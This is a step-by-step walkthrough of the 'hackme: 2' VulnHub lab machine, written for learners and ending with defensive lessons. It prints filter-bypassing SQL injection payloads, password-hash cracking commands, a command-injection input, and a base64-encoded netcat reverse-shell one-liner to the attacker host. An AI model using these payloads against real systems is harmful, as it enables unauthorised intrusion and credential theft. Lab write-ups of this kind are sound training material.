# hackme: 2 — VulnHub Walkthrough (Beginner Friendly)

> **Authorized lab use only.** Run this machine inside an isolated virtual network
> (VirtualBox/VMware *host-only* adaptor). Never attack systems you do not own or
> have written permission to test.

| Field | Value |
| --- | --- |
| **Machine** | hackme: 2 |
| **Difficulty** | Easy / Medium |
| **Author** | x4bx54 |
| **Released** | 6 Dec 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/hackme-2,618/> |
| **Download** | <https://download.vulnhub.com/hackme/hackme2-DHCP.ova> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) on VirtualBox, host-only network |
| **Target OS** | Linux |

---

## 0. What you will learn

hackme: 2 is the sequel to hackme: 1 and is a step harder — the author's own
description says *"more controls are in place to deter malicious attacks… you will
have to think out of the box."* The extra challenge is almost entirely in the
**filter bypasses**: the same classes of bug, but with defensive input filtering
that you must route around.

- Discovering a host and enumerating a PHP web application.
- Building a **SQL injection** payload that survives an input filter by using
  `/**/` comment-as-whitespace and `#` to comment out the rest of the query.
- Dumping the credential table and cracking a password **hash**.
- Recognising a **command-injection** feature in the admin panel.
- Defeating a **space-stripping** filter with `base64_decode()` to deliver a
  reverse shell.
- Privilege escalation via careful filesystem discovery.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Import the `.ova`, boot it, and keep Kali
on the same host-only network.

> **Note:** hackme: 2 does **not** ship `user.txt`/`root.txt` files — the goal is a
> `root` shell. Also note the VM is DHCP and occasionally the bundled MySQL daemon
> needs a restart; if the web app looks broken, reboot the target VM.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# Confirm your own lab IP first
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

```bash
# ARP-scan the subnet for live hosts
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.100  08:00:27:ab:cd:ef       PCS Systemtechnik GmbH
192.168.56.101  08:00:27:11:22:33       PCS Systemtechnik GmbH
```

```bash
# Alternative host discovery
sudo netdiscover -r 192.168.56.0/24
```

![arp scan showing the target host](images/01-recon.png)

**Target IP:** `192.168.56.101`

---

## 2. Enumeration — open ports and services

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.x ((Ubuntu))
|_http-title: hackme
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **How to read it:** only two services, so the web app on port 80 is the whole
> story. SSH is our likely *destination* once we recover a credential.

```bash
# Enumerate hidden files/directories on the web server
gobuster dir -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

```text
/login.php           (Status: 200)
/register.php        (Status: 200)
/welcome.php         (Status: 200)
/index.php           (Status: 200)
```

![nmap and directory enumeration](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Register, log in, and probe the search

Browse to `http://192.168.56.101/` — it is a login page. Register a throwaway
account at `register.php`, then log in. You land on `welcome.php`, which shows a
table of three columns: **Book ID**, **Title**, **Cost**.

> **Why it matters:** a three-column result table tells us the underlying
> `SELECT` returns **three columns** — useful information for the `UNION SELECT`
> we are about to build.

### 3.2 SQL injection + filter bypass

Test the search with a single quote `'`. Instead of a friendly error, the page
**silently shows nothing** — the app filters our input. This is the "control" the
author added.

Two tricks defeat it:

- Write `/**/` (an empty SQL comment) wherever a **space** would go. To SQL it is
  whitespace; to a naive filter it is not a space.
- Use `#` to **comment out** the remainder of the original query.

First, confirm injection and the column count:

```sql
'/**/union/**/select/**/NULL,NULL,NULL#
```

Then print controlled values:

```sql
'/**/union/**/select/**/database(),user(),version()#
```

```text
Book ID   Title            Cost
1         hackme2          root@localhost
```

> **Why it works:** `/**/` replaces the spaces in `UNION SELECT`, and `#` throws
> away everything the developer wrote after our injection point. The filter was
> looking for the literal string `union select` (and raw spaces) — it never saw
> them.

Enumerate the tables in the current database:

```sql
'/**/union/**/select/**/table_name,NULL,NULL/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()#
```

```text
Book ID   Title
1         books
1         users        <-- juicy: credentials
```

List the columns of `users`:

```sql
'/**/union/**/select/**/column_name,NULL,NULL/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'#
```

```text
Book ID   Title
1         id
1         user
1         pasword      <-- note the author's typo
```

Dump the credentials:

```sql
'/**/union/**/select/**/user,pasword,NULL/**/FROM/**/users#
```

```text
Book ID   Title                                   Cost
1         admin                                   <hash>
1         superadmin                              <hash>
```

![SQL injection dumping the users table](images/03-enum.png)

> **Why it works:** `information_schema` is a built-in MySQL catalogue that
> describes every table and column. Reading it lets us map the schema blind, then
> point our `UNION SELECT` at the real credential table. (Column/table names and
> hashes are exactly the kind of values you must read from your own instance.)

### 3.3 Crack the hash and log in as admin

Feed the admin hash to an online lookup ([CrackStation](https://crackstation.net/))
or a local tool:

```bash
hashcat -m 0 admin-hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 admin-hash.txt --show
```

```text
<hash>:<cracked-password>
```

> **Why it works:** the passwords are stored as weak (unsalted) hashes, so a
> wordlist recovers them. Log in at `login.php` as `admin` with the cracked
> password to reach the admin panel.

### 3.4 Command injection in the admin panel

The admin panel offers two features:

1. An **image upload** that only accepts `.jpeg`/`.jpg` — a deliberate dead end.
2. A **user search** that takes a *first name* and a *last name*.

Test the **last-name** field with a shell command:

```text
system("id")
```

```text
Enter the last name: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** the backend passes the last-name value into a PHP `system()`
> call, so whatever shell command we type is executed on the server. The *first
> name* field is displayed but **not** executed; only *last name* reaches
> `system()`.

The catch: the filter **removes spaces**, so a normal reverse-shell one-liner
breaks. The escape is to send the **base64** of the command and let PHP decode it.

### 3.5 The reverse shell (base64 space-bypass)

```bash
# 1) On Kali: start a listener
nc -lvnp 4444
```

```bash
# 2) Build a reverse-shell one-liner and base64-encode it (no wrap)
echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.10 4444 >/tmp/f' | base64 -w0
```

```text
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC41Ni4xMCA0NDQ0ID4vdG1wL2Y=
```

Paste this into the **last-name** field:

```text
system(base64_decode("cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC41Ni4xMCA0NDQ0ID4vdG1wL2Y="))
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 51*08
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** the payload string itself contains **no spaces** (base64 uses
> `A–Z a–z 0–9 + / =`), so it sails past the space filter. On the server,
> `base64_decode()` turns it back into the real one-liner, and `system()` runs it.
> This is the "thinking outside the box" the author refers to.

Stabilise the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then: stty raw -echo; fg   ; export TERM=xterm
```

![Reverse shell as www-data](images/04-foothold.png)
![Interactive shell](images/05-shell.png)

---

## 4. Privilege escalation — becoming root

> **This is the discovery step.** The author deliberately hides the escalation
> path, and detailed public write-ups describe it as *"enumerating the filesystem,
> folder by folder, until you find the file that gives access to root."* Folklore
> in the walkthroughs points at `sudo`, but the exact artifact is image-specific —
> so **enumerate first, then abuse what you actually find.**

Run the standard sweep as `www-data`:

```bash
id; whoami
sudo -l                                     # any sudo rights (often needs www-data's password)
find / -perm -4000 -type f 2>/dev/null      # SUID binaries
getcap -r / 2>/dev/null                     # file capabilities (CAP_SETUID etc.)
cat /etc/crontab; ls -la /etc/cron*         # scheduled jobs
grep -RIn "password\|passwd\|pass:" /home /var/www /opt /etc 2>/dev/null
find / -writable -type f 2>/dev/null        # files we can modify
find / -iname "*pass*" -o -iname "*backup*" -o -iname "*cred*" 2>/dev/null
```

```text
$ find / -perm -4000 -type f 2>/dev/null
... (audit every hit) ...
$ find / -writable -type f 2>/dev/null
... (anything writable that root also touches is a candidate) ...
```

> **Why this works as a method:** local privilege escalation is almost always one
> of a small set of misconfigurations — a SUID/capability binary, a permissive
> `sudo` rule, a root cron job running a writable script, or a plaintext
> credential left in a readable file. The sweep above surfaces all of them at once.

**What you are hunting for on this box:** a readable file, world-writable script,
or permissive `sudo`/SUID entry that the `root` context trusts. When you locate it,
follow its lead:

```bash
# Example pattern A — a discovered credential re-used to change user
cat /path/to/discovered/file
su root                       # or: ssh root@192.168.56.101

# Example pattern B — a sudo rule revealed by enumeration
sudo -l
sudo <allowed-command>        # look the binary up on GTFOBins for a shell escape

# Example pattern C — a SUID binary you can abuse
./discovered-suid-binary
```

> **Why it works:** once you find *the one thing root trusts that you can influence*
> (a password, a writable script run on a schedule, or a binary that runs as root),
> you can make it grant you a root shell. Verify with `id`:

```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

> **Honest note for students:** the precise filename/command differs between
> builds of this image. Run the enumeration on the copy *you* downloaded and follow
> what you find — reproducing the discovery is the entire lesson of this box.

![Privilege-escalation finding](images/06-privesc.png)
![Root shell](images/07-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | SQL injection the filter fails to stop | `welcome.php` search (bypassed with `/**/` and `#`) | Full read of the database, including password hashes |
| 2 | Weak password hashing | `users.pasword` column | Hashes cracked; admin account taken over |
| 3 | OS command injection surfaced in the admin panel | Admin "user search" → last-name field → `system()` | Remote code execution as `www-data` |
| 4 | Filter bypassable by encoding (`base64_decode`) | Same command-injection sink | Space-stripping filter trivially defeated |
| 5 | Local privilege-escalation misconfiguration | Discovered on the filesystem (SUID / sudo / cron / credential) | Escalation to `root` |

## 6. Defensive lessons (blue team)

- **Filters are not fixes.** Blacklisting the word "union" or stripping spaces
  fails the moment an attacker uses comments (`/**/`) or encoding
  (`base64_decode`). Use **prepared statements** so injection is impossible in the
  first place.
- **Never pass user input to the shell.** Avoid `system()`, `exec()`, `shell_exec()`
  and backticks. If you truly must call an external program, use `escapeshellarg()`
  + an allow-list, or better, a language-native API.
- **Hash passwords properly** (bcrypt/scrypt/Argon2, salted) so a database leak
  cannot be turned into plaintext.
- **Least privilege everywhere.** The web tier should not be one misconfiguration
  away from `root`. Audit for SUID binaries, capabilities (`getcap`), permissive
  `sudoers`, and root cron jobs that run world-writable scripts.
- **Detection ideas:** alert on `information_schema` / `UNION` / `/**/` sequences
  and on SQL error spikes; watch for `base64_decode` and known shell strings in
  request bodies; flag unexpected outbound connections from the web user; monitor
  new files in writable locations and any change to SUID bits.

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/hackme-2,618/>
- Download mirror: <https://download.vulnhub.com/hackme/hackme2-DHCP.ova>
- Community writeups consulted:
  - [VulnHub | HACKME: 2 Walkthrough — smile09 (Medium)](https://medium.com/@smile09/vulnhub-hackme-2-walkthrough-49109b8daa4e)
- Docs / tools:
  - [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
  - [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
  - [GTFOBins](https://gtfobins.github.io/)
  - [CrackStation](https://crackstation.net/)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — port/service scan and directory discovery
- [ ] `images/03-enum.png` — SQL injection (with `/**/` bypass) dumping `users`
- [ ] `images/04-foothold.png` — the base64 command injection triggering the shell
- [ ] `images/05-shell.png` — shell as `www-data`
- [ ] `images/06-privesc.png` — the privesc finding on the filesystem
- [ ] `images/07-root-flag.png` — proof of `root` (`id` shows `uid=0`)

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
